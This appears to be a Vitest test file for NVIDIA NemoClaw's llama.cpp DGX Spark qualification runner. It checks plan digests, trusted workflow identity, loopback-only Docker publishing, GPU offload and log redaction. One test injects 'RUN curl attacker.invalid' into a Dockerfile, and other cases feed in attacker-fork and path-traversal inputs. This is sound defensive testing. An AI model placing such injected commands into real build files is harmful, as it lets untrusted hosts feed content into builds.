// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import { createHash } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { describe, expect, it } from "vitest";

import { loadLlamaCppImageConfig } from "../../../scripts/checks/export-llama-cpp-image-config.mts";
import {
  buildCandidateImageArgv,
  buildRuntimeLogForbiddenValues,
  buildServerContainerArgv,
  expectedRegistryName,
  expectedRegistryOwner,
  hashModelFile,
  insertQualificationLoopbackPublishArgv,
  parseNvidiaSmi,
  parseQualificationInvocation,
  type QualificationInvocation,
  type QualificationPlan,
  qualifyDockerLoopbackPublishAuthority,
  sha256Text,
  validateCandidateDockerfile,
  validateChatCompletionResponse,
  validateModelsResponse,
  validateOpenClawQualificationImageLabels,
  validateQualificationPlan,
  validateRuntimeLogRedaction,
  validateStartupLog,
} from "../../../scripts/checks/run-llama-cpp-dgx-spark-qualification.mts";
import {
  consumeDockerLoopbackPublishAuthority,
  type DockerLoopbackPublishAuthority,
} from "../../../src/lib/inference/llama-cpp/host-local-runtime";

const BASE_SHA = "b".repeat(40);
const HEAD_SHA = "a".repeat(40);
const WORKFLOW_SHA = "c".repeat(40);
const RUN_ID = "42";
const RUN_ATTEMPT = "2";
const MODEL_PATH = "/var/lib/nemoclaw/models/Nemotron-3-Nano-30B-A3B-UD-Q4_K_XL.gguf";
const EXPECTED_MODEL = "nvidia-nemotron-3-nano-30b-a3b";
const repoRoot = path.resolve(import.meta.dirname, "../../..");
const trustedImageRoot = path.join(repoRoot, "managed-inference", "images", "llama-cpp");

const config = loadLlamaCppImageConfig();
const planSource = config.publication_qualification_plan;
const planDigest = config.publication_qualification_plan_sha256;
const plan = validateQualificationPlan(planSource, planDigest);
function loopbackPublishAuthority(): ReturnType<typeof qualifyDockerLoopbackPublishAuthority> {
  return qualifyDockerLoopbackPublishAuthority("28.3.3");
}

function trustedEnvironment(overrides: Record<string, string | undefined> = {}) {
  return {
    GITHUB_ACTOR: "trusted-maintainer",
    GITHUB_ACTOR_ID: "41898282",
    GITHUB_EVENT_NAME: "workflow_dispatch",
    GITHUB_REF: "refs/heads/main",
    GITHUB_REPOSITORY: "NVIDIA/NemoClaw",
    GITHUB_RUN_ATTEMPT: RUN_ATTEMPT,
    GITHUB_RUN_ID: RUN_ID,
    GITHUB_SHA: WORKFLOW_SHA,
    GITHUB_WORKFLOW_REF: "NVIDIA/NemoClaw/.github/workflows/e2e.yaml@refs/heads/main",
    ...overrides,
  };
}

function invocationArguments() {
  return [
    "--base-sha",
    BASE_SHA,
    "--candidate-root",
    "/work/candidate",
    "--head-sha",
    HEAD_SHA,
    "--model-host-path",
    MODEL_PATH,
    "--output",
    "/work/artifacts/evidence.json",
    "--plan",
    "/work/tmp/plan.json",
    "--plan-sha256",
    planDigest,
    "--registry-name",
    expectedRegistryName(RUN_ID, RUN_ATTEMPT),
    "--run-attempt",
    RUN_ATTEMPT,
    "--run-id",
    RUN_ID,
    "--workflow-sha",
    WORKFLOW_SHA,
  ];
}

function parsedInvocation(): QualificationInvocation {
  const invocation = parseQualificationInvocation(invocationArguments(), trustedEnvironment());
  expect(invocation).toMatchObject({ cleanupOnly: false });
  return invocation as QualificationInvocation;
}

function mutatedPlan(mutate: (value: Record<string, any>) => void): [string, string] {
  const value = JSON.parse(planSource) as Record<string, any>;
  mutate(value);
  const source = JSON.stringify(value);
  return [source, sha256Text(source)];
}

function valuesAfter(argv: string[], option: string): string[] {
  return argv.flatMap((value, index) => (argv[index - 1] === option ? [value] : []));
}

function qualificationPlanForModel(content: Buffer): QualificationPlan {
  return {
    ...plan,
    recipe: {
      ...plan.recipe,
      model: {
        ...plan.recipe.model,
        file: {
          ...plan.recipe.model.file,
          digest: `sha256:${createHash("sha256").update(content).digest("hex")}`,
          sizeBytes: content.length,
        },
      },
    },
  } as unknown as QualificationPlan;
}

describe("trusted llama.cpp DGX Spark qualification runner", () => {
  it("requires a patched live Docker server before loopback publication (#8260)", () => {
    ["27.5.1", "28.0.0", "28.3.2", "28.3.3-rc.1", "", "client 29.0.0"].forEach((version) => {
      expect(() => qualifyDockerLoopbackPublishAuthority(version)).toThrow(
        /Docker Engine 28\.3\.3 or newer/u,
      );
    });
    expect(qualifyDockerLoopbackPublishAuthority("28.3.3\n").serverVersion).toBe("28.3.3");
    expect(qualifyDockerLoopbackPublishAuthority("28.3.3+ubuntu.1").serverVersion).toBe(
      "28.3.3+ubuntu.1",
    );
    expect(qualifyDockerLoopbackPublishAuthority("29.0.0").serverVersion).toBe("29.0.0");

    const singleUseAuthority = qualifyDockerLoopbackPublishAuthority("28.3.3");
    ([
      Object.create(singleUseAuthority),
      Object.assign({}, singleUseAuthority),
    ] as DockerLoopbackPublishAuthority[]).forEach((clonedAuthority) => {
      expect(() => consumeDockerLoopbackPublishAuthority(clonedAuthority)).toThrow(
        /authority is invalid/u,
      );
    });
    expect(() => consumeDockerLoopbackPublishAuthority(singleUseAuthority)).not.toThrow();
    expect(() => consumeDockerLoopbackPublishAuthority(singleUseAuthority)).toThrow(
      /already consumed/u,
    );
    expect(() =>
      consumeDockerLoopbackPublishAuthority({
        serverVersion: "29.0.0",
      } as DockerLoopbackPublishAuthority),
    ).toThrow(/authority is invalid/u);
  });

  it.each(
    Array.from(
      [
        (value: Record<string, any>) => {
          value.untrusted = true;
        },
        (value: Record<string, any>) => {
          value.imageBuild.platform.platform = "linux/amd64";
        },
        (value: Record<string, any>) => {
          value.imageBuild.cuda.runtimeBase = "docker.io/nvidia/cuda:latest";
        },
        (value: Record<string, any>) => {
          value.recipe.runtime.gpu.cpuFallback = "allow";
        },
        (value: Record<string, any>) => {
          value.recipe.surfaces.ui = "enabled";
        },
      ],
      (value) => [value],
    ),
  )(
    "accepts only the canonical digest-bound declarative execution plan [case %#] (#8260)",
    (mutate) => {
      expect(plan.contractVersion).toBe(1);
      expect(plan.recipe.id).toBe("llama-cpp.nemotron-3-nano-30b-a3b.spark-single.v1");
      expect(() => validateQualificationPlan(planSource, `sha256:${"0".repeat(64)}`)).toThrow(
        /digest mismatch/u,
      );

      const spaced = `${planSource}\n`;
      expect(() => validateQualificationPlan(spaced, sha256Text(spaced))).toThrow(/canonical/u);

      const [source, digest] = mutatedPlan(mutate);
      expect(() => validateQualificationPlan(source, digest)).toThrow();
    },
  );

  it("binds normal and cleanup invocations to the trusted workflow run (#8260)", () => {
    expect(parsedInvocation()).toEqual({
      candidateBase: BASE_SHA,
      candidateHead: HEAD_SHA,
      candidateRoot: "/work/candidate",
      cleanupOnly: false,
      modelHostPath: MODEL_PATH,
      output: "/work/artifacts/evidence.json",
      planFile: "/work/tmp/plan.json",
      planSha256: planDigest,
      registryName: expectedRegistryName(RUN_ID, RUN_ATTEMPT),
      registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
      runAttempt: RUN_ATTEMPT,
      runId: RUN_ID,
      workflowSha: WORKFLOW_SHA,
    });

    expect(
      parseQualificationInvocation(
        invocationArguments(),
        trustedEnvironment({
          GITHUB_ACTOR: "merge-queue[bot]",
          GITHUB_ACTOR_ID: "12345",
          GITHUB_EVENT_NAME: "push",
        }),
      ),
    ).toMatchObject({ cleanupOnly: false, workflowSha: WORKFLOW_SHA });

    expect(
      parseQualificationInvocation(
        [
          "--cleanup-only",
          "--registry-name",
          expectedRegistryName(RUN_ID, RUN_ATTEMPT),
          "--run-attempt",
          RUN_ATTEMPT,
          "--run-id",
          RUN_ID,
        ],
        trustedEnvironment(),
      ),
    ).toEqual({
      cleanupOnly: true,
      registryName: expectedRegistryName(RUN_ID, RUN_ATTEMPT),
      registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
      runAttempt: RUN_ATTEMPT,
      runId: RUN_ID,
    });
  });

  it.each(
    Array.from(
      [
        trustedEnvironment({ GITHUB_REPOSITORY: "attacker/fork" }),
        trustedEnvironment({ GITHUB_REF: "refs/pull/1/merge" }),
        trustedEnvironment({ GITHUB_EVENT_NAME: "pull_request_target" }),
        trustedEnvironment({ GITHUB_ACTOR: "untrusted user" }),
        trustedEnvironment({ GITHUB_ACTOR_ID: "0" }),
        trustedEnvironment({ GITHUB_RUN_ATTEMPT: "3" }),
        trustedEnvironment({ GITHUB_RUN_ID: "43" }),
        trustedEnvironment({ GITHUB_SHA: HEAD_SHA }),
        trustedEnvironment({
          GITHUB_WORKFLOW_REF: "NVIDIA/NemoClaw/.github/workflows/e2e.yaml@refs/heads/feature",
        }),
      ],
      (value) => [value],
    ),
  )(
    "rejects hostile CLI fields, paths, ownership, and workflow identity [case %#] (#8260)",
    (environment) => {
      const unknown = [...invocationArguments(), "--extra", "value"];
      expect(() => parseQualificationInvocation(unknown, trustedEnvironment())).toThrow();

      const duplicate = [...invocationArguments(), "--run-id", RUN_ID];
      expect(() => parseQualificationInvocation(duplicate, trustedEnvironment())).toThrow();

      const traversal = invocationArguments();
      traversal[traversal.indexOf("--candidate-root") + 1] = "/work/../candidate";
      expect(() => parseQualificationInvocation(traversal, trustedEnvironment())).toThrow();

      const wrongRegistry = invocationArguments();
      wrongRegistry[wrongRegistry.indexOf("--registry-name") + 1] = "nemoclaw-llama-cpp-999-1";
      expect(() => parseQualificationInvocation(wrongRegistry, trustedEnvironment())).toThrow();

      expect(() => parseQualificationInvocation(invocationArguments(), environment)).toThrow();
    },
  );

  it("builds the exact ARM64 candidate plan from the trusted image context (#8260)", () => {
    const argv = buildCandidateImageArgv(plan, parsedInvocation(), "/work/tmp/metadata.json");
    expect(valuesAfter(argv, "--platform")).toEqual(["linux/arm64"]);
    expect(valuesAfter(argv, "--tag")).toEqual([
      `localhost:5000/nemoclaw-llama-cpp-dgx-spark/llama-cpp-server:${HEAD_SHA}`,
    ]);
    expect(argv).toContain("--push");
    expect(argv).not.toContain("--load");
    expect(valuesAfter(argv, "--file")).toEqual([path.join(trustedImageRoot, "Dockerfile")]);
    expect(argv.at(-1)).toBe(trustedImageRoot);
    expect(argv).not.toContain("/work/candidate");
    expect(valuesAfter(argv, "--build-arg")).toEqual(
      expect.arrayContaining([
        "CUDA_ARCHITECTURES=121a-real",
        `CUDA_DEV_IMAGE=${plan.imageBuild.cuda.developmentBase}`,
        `CUDA_RUNTIME_IMAGE=${plan.imageBuild.cuda.runtimeBase}`,
        `LLAMA_CPP_ARCHIVE_SHA256=${plan.imageBuild.source.archiveSha256}`,
        `LLAMA_CPP_REVISION=${plan.imageBuild.source.revision}`,
        `NEMOCLAW_REVISION=${HEAD_SHA}`,
        "TARGETPLATFORM=linux/arm64",
      ]),
    );
  });

  it("requires the candidate Dockerfile to byte-match trusted main (#8260)", () => {
    const candidateRoot = fs.realpathSync(
      fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-llama-cpp-candidate-")),
    );
    const candidateImageRoot = path.join(candidateRoot, "managed-inference", "images", "llama-cpp");
    fs.mkdirSync(candidateImageRoot, { recursive: true });
    fs.copyFileSync(
      path.join(trustedImageRoot, "Dockerfile"),
      path.join(candidateImageRoot, "Dockerfile"),
    );
    try {
      expect(() => validateCandidateDockerfile(candidateRoot)).not.toThrow();
      fs.appendFileSync(
        path.join(candidateImageRoot, "Dockerfile"),
        "\nRUN curl attacker.invalid\n",
      );
      expect(() => validateCandidateDockerfile(candidateRoot)).toThrow(/byte-match/u);
    } finally {
      fs.rmSync(candidateRoot, { force: true, recursive: true });
    }
  });

  it("publishes the recipe-selected request guard on the loopback address without putting the API key in Docker arguments (#8667)", () => {
    const content = Buffer.from("qualification model fixture\n", "utf8");
    const testPlan = qualificationPlanForModel(content);
    const modelRoot = fs.realpathSync(
      fs.mkdtempSync(path.join(os.tmpdir(), "nemoclaw-qualification-model-")),
    );
    const modelHostPath = path.join(modelRoot, testPlan.recipe.model.file.path);
    fs.writeFileSync(modelHostPath, content);
    try {
      const model = hashModelFile(modelHostPath, testPlan);
      const modelStatus = fs.lstatSync(modelHostPath, { bigint: true });
      expect(model.filesystemIdentity).toEqual({
        ctimeNs: modelStatus.ctimeNs,
        dev: modelStatus.dev,
        ino: modelStatus.ino,
        mtimeNs: modelStatus.mtimeNs,
        size: modelStatus.size,
      });
      const imageReference = `localhost:5000/repo@sha256:${"d".repeat(64)}`;
      const containerOptions = {
        apiKeyHostPath: "/work/tmp/api-key",
        containerName: "qualified-server",
        imageReference,
        model,
        networkName: "qualified-internal",
        registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
        runtimeGid: 1001,
        runtimeUid: 1001,
      } as const;
      const argv = buildServerContainerArgv(testPlan, {
        ...containerOptions,
        loopbackPublishAuthority: loopbackPublishAuthority(),
      });
      expect(argv).toEqual(
        expect.arrayContaining([
          "--read-only",
          "--cap-drop",
          "ALL",
          "no-new-privileges=true",
          "--gpu-layers",
          "all",
          "--ctx-size",
          String(testPlan.recipe.serve.contextSize),
          "--batch-size",
          String(testPlan.recipe.serve.batchSize),
          "--ubatch-size",
          String(testPlan.recipe.serve.microBatchSize),
          "--cache-type-k",
          testPlan.recipe.serve.kvCache.key,
          "--cache-type-v",
          testPlan.recipe.serve.kvCache.value,
          "--flash-attn",
          "on",
          "--metrics",
          "--no-ui",
          "--no-slots",
          "--no-mmproj",
          "--no-agent",
        ]),
      );
      const publishMappings = valuesAfter(argv, "--publish");
      expect(publishMappings).toEqual([`127.0.0.1::${String(testPlan.recipe.serve.port)}`]);
      expect(publishMappings.some((mapping) => mapping.startsWith("0.0.0.0:"))).toBe(false);
      const imageIndex = argv.indexOf(imageReference);
      expect(argv.slice(imageIndex - 2, imageIndex + 1)).toEqual([
        "--publish",
        publishMappings[0],
        imageReference,
      ]);
      expect(valuesAfter(argv, "--entrypoint")).toEqual([
        "/usr/local/bin/nemoclaw-llama-cpp-request-guard",
      ]);
      expect(valuesAfter(argv, "--listen-port")).toEqual([String(testPlan.recipe.serve.port)]);
      expect(valuesAfter(argv, "--upstream-port")).toEqual([
        String(testPlan.recipe.serve.requestGuard.upstreamPort),
      ]);
      expect(valuesAfter(argv, "--max-request-body-bytes")).toEqual([
        String(testPlan.recipe.serve.limits.maxRequestBodyBytes),
      ]);
      expect(valuesAfter(argv, "--max-request-header-bytes")).toEqual([
        String(testPlan.recipe.serve.limits.maxRequestHeaderBytes),
      ]);
      expect(valuesAfter(argv, "--max-output-tokens")).toEqual([
        String(testPlan.recipe.serve.limits.maxOutputTokens),
      ]);
      expect(valuesAfter(argv, "--request-timeout-seconds")).toEqual([
        String(testPlan.recipe.serve.limits.requestTimeoutSeconds),
      ]);
      expect(valuesAfter(argv, "--shutdown-timeout-seconds")).toEqual([
        String(testPlan.recipe.serve.limits.shutdownTimeoutSeconds),
      ]);
      const separator = argv.indexOf("--");
      expect(argv[separator + 1]).toBe("/usr/local/bin/llama-server");
      expect(valuesAfter(argv.slice(separator), "--host")).toEqual(["127.0.0.1"]);
      expect(valuesAfter(argv.slice(separator), "--port")).toEqual([
        String(testPlan.recipe.serve.requestGuard.upstreamPort),
      ]);
      expect(valuesAfter(argv.slice(separator), "--n-predict")).toEqual([
        String(testPlan.recipe.serve.limits.maxOutputTokens),
      ]);
      const agentQualificationArgv = buildServerContainerArgv(testPlan, {
        ...containerOptions,
        hostPort: testPlan.recipe.serve.port,
        loopbackPublishAuthority: loopbackPublishAuthority(),
      });
      expect(valuesAfter(agentQualificationArgv, "--publish")).toEqual([
        `127.0.0.1:${String(testPlan.recipe.serve.port)}:${String(testPlan.recipe.serve.port)}`,
      ]);
      const alternateContainerPort = 9_081;
      // The adapter must use its validated plan input instead of duplicating the current recipe port.
      const alternatePortPlan = {
        ...testPlan,
        recipe: {
          ...testPlan.recipe,
          serve: { ...testPlan.recipe.serve, port: alternateContainerPort },
        },
      } as unknown as QualificationPlan;
      const alternatePortArgv = buildServerContainerArgv(alternatePortPlan, {
        ...containerOptions,
        loopbackPublishAuthority: loopbackPublishAuthority(),
      });
      expect(valuesAfter(alternatePortArgv, "--publish")).toEqual([
        `127.0.0.1::${String(alternateContainerPort)}`,
      ]);
      expect(valuesAfter(alternatePortArgv, "--listen-port")).toEqual([
        String(alternateContainerPort),
      ]);
      expect(valuesAfter(argv, "--network")).toEqual(["qualified-internal"]);
      expect(valuesAfter(argv, "--user")).toEqual(["1001:1001"]);
      expect(valuesAfter(argv, "--gpus")).toEqual(["driver=nvidia,count=1"]);
      expect(valuesAfter(argv, "--cap-drop")).toEqual(["ALL"]);
      expect(valuesAfter(argv, "--security-opt")).toEqual(["no-new-privileges=true"]);
      expect(valuesAfter(argv, "--api-key-file")).toEqual(["/run/secrets/llama-cpp-api-key"]);
      expect(argv).not.toContain("--api-key");
      expect(valuesAfter(argv, "--mount")).toEqual([
        `type=bind,source=${modelHostPath},target=/models/${testPlan.recipe.model.file.path},readonly`,
        "type=bind,source=/work/tmp/api-key,target=/run/secrets/llama-cpp-api-key,readonly",
      ]);
      expect(valuesAfter(argv, "--memory")).toEqual([
        `${testPlan.recipe.runtime.resources.memoryBytes}b`,
      ]);
      expect(valuesAfter(argv, "--memory-swap")).toEqual([
        `${testPlan.recipe.runtime.resources.memoryBytes}b`,
      ]);
      expect(valuesAfter(argv, "--pids-limit")).toEqual([
        String(testPlan.recipe.runtime.resources.pidsLimit),
      ]);
      expect(valuesAfter(argv, "--tmpfs")).toEqual([
        `/tmp:rw,noexec,nosuid,nodev,size=${testPlan.recipe.runtime.resources.writableStorageBytes},uid=1001,gid=1001,mode=1777`,
      ]);
      expect(() =>
        buildServerContainerArgv(testPlan, {
          apiKeyHostPath: "/work/tmp/api-key",
          containerName: "qualified-server",
          imageReference: `localhost:5000/repo@sha256:${"d".repeat(64)}`,
          model,
          networkName: "qualified-internal",
          registryOwner: expectedRegistryOwner(RUN_ID, RUN_ATTEMPT),
          runtimeGid: 1001,
          runtimeUid: 0,
          loopbackPublishAuthority: loopbackPublishAuthority(),
        }),
      ).toThrow(/runtime uid/u);
    } finally {
      fs.rmSync(modelRoot, { force: true, recursive: true });
    }
  });

  it.each([
    { publishArgv: ["--publish", "0.0.0.0:8081:8081"] },
    { publishArgv: ["--publish=0.0.0.0:8081:8081"] },
    { publishArgv: ["-p", "0.0.0.0:8081:8081"] },
    { publishArgv: ["-p0.0.0.0:8081:8081"] },
    { publishArgv: ["--publish-all"] },
    { publishArgv: ["--publish-all=true"] },
    { publishArgv: ["-P"] },
    { publishArgv: ["-P=true"] },
  ])(
    "rejects Docker publish aliases before inserting one loopback mapping at the image boundary [case %#] (#8667)",
    ({ publishArgv }) => {
      const imageReference = `localhost:5000/repo@sha256:${"d".repeat(64)}`;
      const containerPort = 9_081;
      const options = () => ({
        containerPort,
        imageReference,
        loopbackPublishAuthority: loopbackPublishAuthority(),
      });
      const consumedAuthority = loopbackPublishAuthority();

      expect(
        insertQualificationLoopbackPublishArgv(["run", imageReference], {
          ...options(),
          loopbackPublishAuthority: consumedAuthority,
        }),
      ).toEqual(["run", "--publish", `127.0.0.1::${String(containerPort)}`, imageReference]);
      expect(() =>
        insertQualificationLoopbackPublishArgv(["run", imageReference], {
          ...options(),
          loopbackPublishAuthority: consumedAuthority,
        }),
      ).toThrow(/already consumed/u);
      const authorityAfterRejectedBoundary = loopbackPublishAuthority();
      expect(() =>
        insertQualificationLoopbackPublishArgv(["run"], {
          ...options(),
          loopbackPublishAuthority: authorityAfterRejectedBoundary,
        }),
      ).toThrow(/exactly one Docker image reference/u);
      expect(
        insertQualificationLoopbackPublishArgv(["run", imageReference], {
          ...options(),
          loopbackPublishAuthority: authorityAfterRejectedBoundary,
        }),
      ).toEqual(["run", "--publish", `127.0.0.1::${String(containerPort)}`, imageReference]);
      expect(() =>
        insertQualificationLoopbackPublishArgv(["run", imageReference, imageReference], options()),
      ).toThrow(/exactly one Docker image reference/u);

      expect(() =>
        insertQualificationLoopbackPublishArgv(["run", ...publishArgv, imageReference], options()),
      ).toThrow(/must not publish/u);

      expect(
        insertQualificationLoopbackPublishArgv(
          ["run", imageReference, "-p", "guard-value"],
          options(),
        ),
      ).toEqual([
        "run",
        "--publish",
        `127.0.0.1::${String(containerPort)}`,
        imageReference,
        "-p",
        "guard-value",
      ]);
    },
  );

  it("accepts only the exact NVIDIA OpenClaw ARM64 managed-image labels", () => {
    const labels = {
      "io.nvidia.nemoclaw.agent": "openclaw",
      "io.nvidia.nemoclaw.managed-image.contract": "1",
      "io.nvidia.nemoclaw.managed-image.platform": "linux/arm64",
      "org.opencontainers.image.revision": "eb1d2f5700393892f227ac9fd56f485fc6718bce",
      "org.opencontainers.image.source": "https://github.com/NVIDIA/NemoClaw",
    };
    expect(() =>
      validateOpenClawQualificationImageLabels(
        JSON.stringify(labels),
        "eb1d2f5700393892f227ac9fd56f485fc6718bce",
      ),
    ).not.toThrow();
    expect(() =>
      validateOpenClawQualificationImageLabels(
        JSON.stringify({ ...labels, "io.nvidia.nemoclaw.agent": "hermes" }),
        "eb1d2f5700393892f227ac9fd56f485fc6718bce",
      ),
    ).toThrow(/declarative identity/u);
    expect(() =>
      validateOpenClawQualificationImageLabels(JSON.stringify(labels), "f".repeat(40)),
    ).toThrow(/declarative identity/u);
    expect(() => validateOpenClawQualificationImageLabels("{", "f".repeat(40))).toThrow(
      /labels are invalid/u,
    );
  });

  it.each([
    "llama_model_loader: offloaded 56/57 layers to GPU",
    "warning: no usable GPU found, --gpu-layers option will be ignored",
    "CPU fallback enabled\noffloaded 57/57 layers to GPU",
    "server is listening",
    "offloaded 57/57 layers to GPU\noffloaded 58/58 layers to GPU",
  ])(
    "requires unambiguous full GPU offload and rejects CPU fallback warnings [%s] (#8260)",
    (log) => {
      expect(validateStartupLog("llama_model_loader: offloaded 57/57 layers to GPU\n")).toEqual({
        offloadedLayers: 57,
        totalLayers: 57,
      });

      expect(() => validateStartupLog(log)).toThrow();
    },
  );

  it("rejects every runner-derived credential, model path, prompt, and response in bounded runtime logs (#8144)", () => {
    const apiKey = "a".repeat(64);
    const authorization = `Bearer ${apiKey}`;
    const forbidden = buildRuntimeLogForbiddenValues(
      plan,
      parsedInvocation(),
      apiKey,
      authorization,
    );
    expect(forbidden).toEqual(
      expect.arrayContaining([
        `${authorization.slice(0, -1)}0`,
        MODEL_PATH,
        `/models/${plan.recipe.model.file.path}`,
        "This request must be rejected.",
        "Return one short readiness token.",
        "Reply with exactly: ready",
        "Reply with one token.",
        "Count upward without stopping.",
        "Report the requested qualification status.",
        "Use the available tool to get the weather in Seattle.",
        '{"conditions":"clear","temperature_c":21}',
        '{"location":"Seattle"}',
        plan.qualification.agentQualification.prompts.normal,
        plan.qualification.agentQualification.prompts.tool,
        plan.qualification.agentQualification.prompts.continuation,
        plan.qualification.agentQualification.fixture.value,
      ]),
    );
    expect(validateRuntimeLogRedaction("server request complete\n", forbidden)).toEqual({
      ok: true,
    });
    forbidden.forEach((value) => {
      expect(() => validateRuntimeLogRedaction(`server log: ${value}\n`, forbidden)).toThrow(
        /credential, path, prompt, or response/u,
      );
    });
  });

  it.each([
    "NVIDIA GB10, 580.65.05",
    "NVIDIA H100 80GB HBM3, 580.65.06",
    "NVIDIA GB10, 580.65.06\nNVIDIA GB10, 580.65.06",
  ])(
    "accepts only one NVIDIA GB10 at or above the declarative driver floor [%s] (#8260)",
    (output) => {
      expect(parseNvidiaSmi("NVIDIA GB10, 580.65.06\n", "580.65.06")).toEqual({
        count: 1,
        driverVersion: "580.65.06",
        name: "NVIDIA GB10",
      });

      expect(() => parseNvidiaSmi(output, "580.65.06")).toThrow();
    },
  );

  it("validates exact served-model and authenticated completion response shapes (#8260)", () => {
    expect(() =>
      validateModelsResponse({ data: [{ id: EXPECTED_MODEL }], object: "list" }, EXPECTED_MODEL),
    ).not.toThrow();
    expect(() =>
      validateModelsResponse(
        {
          data: [{ id: EXPECTED_MODEL }, { id: "unexpected" }],
          object: "list",
        },
        EXPECTED_MODEL,
      ),
    ).toThrow();

    expect(() =>
      validateChatCompletionResponse(
        {
          choices: [{ message: { content: "ready", role: "assistant" } }],
          model: EXPECTED_MODEL,
          object: "chat.completion",
        },
        EXPECTED_MODEL,
      ),
    ).not.toThrow();
    expect(() =>
      validateChatCompletionResponse(
        {
          choices: [{ message: { content: "ready", role: "assistant" } }],
          model: "unexpected",
          object: "chat.completion",
        },
        EXPECTED_MODEL,
      ),
    ).toThrow();
  });
});
